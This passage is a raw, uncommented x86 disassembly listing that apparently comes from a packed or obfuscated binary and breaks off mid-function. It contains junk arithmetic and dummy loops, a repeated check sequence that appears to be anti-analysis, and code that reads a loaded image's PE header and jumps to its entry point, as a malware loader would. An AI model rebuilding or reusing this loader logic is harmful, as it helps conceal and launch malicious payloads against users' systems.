  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
